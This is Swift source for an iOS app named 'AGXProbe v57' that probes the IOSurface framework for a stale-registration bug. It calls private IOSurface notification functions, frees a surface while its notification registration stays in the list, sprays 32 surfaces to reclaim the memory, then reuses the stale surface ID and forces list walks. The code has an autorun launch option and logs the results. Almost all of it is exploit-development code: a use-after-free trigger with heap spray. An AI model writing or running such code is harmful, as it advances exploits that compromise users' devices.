import SwiftUI
import Darwin
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v57 - stale list reclaim test").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v57")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32
    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t

    private var gCreate: CreateFn?
    private var gGetID: GetIDFn?
    private var gSet: SetNotifyFn?
    private var gRemove: RemoveNotifyFn?
    private var p1: mach_port_t = 0
    private var p2: mach_port_t = 0
    private var p3: mach_port_t = 0

    private func loadSymbols() -> Bool {
        guard let h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY) else {
            emit("[NO] dlopen"); return false
        }
        defer { dlclose(h) }
        guard let cs = dlsym(h, "IOSurfaceCreate"), let isym = dlsym(h, "IOSurfaceGetID"),
              let ss = dlsym(h, "IOSurfaceClientSetSurfaceNotify"),
              let rs = dlsym(h, "IOSurfaceClientRemoveSurfaceNotify") else {
            emit("[NO] symbol"); return false
        }
        gCreate = unsafeBitCast(cs, to: CreateFn.self)
        gGetID = unsafeBitCast(isym, to: GetIDFn.self)
        gSet = unsafeBitCast(ss, to: SetNotifyFn.self)
        gRemove = unsafeBitCast(rs, to: RemoveNotifyFn.self)
        return true
    }

    private func makeSurface() -> UnsafeMutableRawPointer? {
        guard let gCreate else { return nil }
        let p: [String: Any] = ["IOSurfaceWidth": 256, "IOSurfaceHeight": 256,
                                "IOSurfaceBytesPerElement": 4]
        return gCreate(p as CFDictionary)
    }

    private func release(_ s: UnsafeMutableRawPointer) {
        Unmanaged<AnyObject>.fromOpaque(s).release()
    }

    private func krstr(_ kr: kern_return_t) -> String {
        let u = UInt32(bitPattern: kr)
        switch u {
        case 0: return "0x0 OK"
        case 0xe00002c2: return "BadArg"
        case 0xe00002c9: return "dup"
        default: return "0x\(String(u, radix: 16))"
        }
    }

    /// non-blocking drain of a port (proper buffer + bounded timeout)
    private func drain(_ port: mach_port_t, _ tag: String) {
        var n = 0
        var last: kern_return_t = 0
        while true {
            var buf = [UInt8](repeating: 0, count: 0x400)
            let kr = buf.withUnsafeMutableBytes { rb -> kern_return_t in
                mach_msg(rb.baseAddress!.assumingMemoryBound(to: mach_msg_header_t.self),
                         MACH_RCV_TIMEOUT, 0x400, port, UInt32(50), mach_port_t(0), 0)
            }
            last = kr
            if kr != 0 { break }
            n += 1
            if n > 64 { break }
        }
        emit("  drain \(tag): \(n) message(s), last kr=0x\(String(UInt32(bitPattern: last), radix: 16))")
    }

    private func triggerWalk(_ s: UnsafeMutableRawPointer, _ tag: String) {
        guard let h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW) else { return }
        typealias SetValueFn = @convention(c) (UnsafeMutableRawPointer, CFString, CFTypeRef) -> kern_return_t
        guard let sv = dlsym(h, "IOSurfaceSetValue") else { emit("  no IOSurfaceSetValue"); return }
        let setValue = unsafeBitCast(sv, to: SetValueFn.self)
        let key = CFStringCreateWithCString(nil, "AGXProbeKey", CFStringBuiltInEncodings.UTF8.rawValue)
        let val = CFStringCreateWithCString(nil, "AGXProbeVal", CFStringBuiltInEncodings.UTF8.rawValue)
        let kr = setValue(s, key!, val!)
        emit("  IOSurfaceSetValue(\(tag)) -> \(krstr(kr))")
    }

    private func probe() {
        emit("\n=== step 0: three notify ports ===")
        let kr1 = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &p1)
        let kr2 = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &p2)
        let kr3 = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &p3)
        emit("  P1 = 0x\(String(p1, radix: 16)) kr=\(krstr(kr1))")
        emit("  P2 = 0x\(String(p2, radix: 16)) kr=\(krstr(kr2))")
        emit("  P3 = 0x\(String(p3, radix: 16)) kr=\(krstr(kr3))")

        emit("\n=== step 1: does the notification fire on registration alone? ===")
        guard let a = makeSurface() else { return }
        let x = UInt64(gGetID!(a))
        emit("  A id=0x\(String(x, radix: 16))")
        emit("  set(P1,1,X) -> \(krstr(gSet!(p1, 1, x)))")
        drain(p1, "P1 after set")
        emit("  (if 0 messages, registration alone does not notify)")

        emit("\n=== step 2: walk A, expect P1 message ===")
        triggerWalk(a, "A")
        drain(p1, "P1 after walk A")

        emit("\n=== step 3: release A, spray, then walk a NEW surface B ===")
        release(a)
        emit("  A released (registration still in list)")
        var spray: [UnsafeMutableRawPointer] = []
        for _ in 0..<32 { if let s = makeSurface() { spray.append(s) } }
        emit("  sprayed \(spray.count) surfaces")
        guard let b = makeSurface() else { return }
        let y = UInt64(gGetID!(b))
        emit("  B id=0x\(String(y, radix: 16))")
        emit("  set(P2,1,Y) -> \(krstr(gSet!(p2, 1, y)))")
        drain(p1, "P1 after set on B")
        drain(p2, "P2 after set on B")

        emit("  -- walk B --")
        triggerWalk(b, "B")
        drain(p1, "P1 after walk B")
        drain(p2, "P2 after walk B")

        emit("  -- set(stale X) --")
        emit("  set(P3,1,X) -> \(krstr(gSet!(p3, 1, x)))")
        emit("  remove(X) -> \(krstr(gRemove!(x)))")
        emit("  remove(Y) -> \(krstr(gRemove!(y)))")

        emit("\n=== step 4: walk a third surface C (never registered) ===")
        guard let c = makeSurface() else { return }
        let z = UInt64(gGetID!(c))
        emit("  C id=0x\(String(z, radix: 16))")
        triggerWalk(c, "C")
        drain(p1, "P1 after walk C")
        drain(p2, "P2 after walk C")
        drain(p3, "P3 after walk C")

        emit("\n=== step 5: cleanup ===")
        for s in spray { release(s) }
        release(b); release(c)
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v57 - stale list reclaim test ===")
        guard loadSymbols() else { emit("=== failed ==="); status = "Failed"; isRunning = false; return }
        // let the scene finish creating: scene-create watchdog allows only ~20s
        try? await Task.sleep(nanoseconds: 3_500_000_000)
        probe()
        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
